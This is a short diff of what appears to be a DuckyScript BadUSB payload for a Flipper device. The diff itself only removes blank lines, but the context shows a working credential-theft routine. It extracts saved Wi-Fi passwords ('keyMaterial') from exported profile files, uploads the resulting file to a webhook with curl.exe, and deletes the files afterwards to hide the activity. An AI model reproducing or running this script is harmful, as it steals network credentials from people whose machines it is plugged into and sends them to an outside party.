@@ -13,7 +13,6 @@ ENTER
 DELAY 500
 STRING Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-fi.txt
 ENTER
-
 DELAY 500
 STRING $content='Flipper Flap Feport'; $payload=[PSCustomObject]@{ content=$content }
 ENTER
@@ -22,7 +21,6 @@ STRING Invoke-RestMethod -ContentType "Application/Json" -Uri $webhook -Method P
 ENTER
 DELAY 500
 STRING curl.exe -F "file1=@Wi-fi.txt" $webhook
-
 ENTER
 DELAY 500
 STRING rm Wi-*
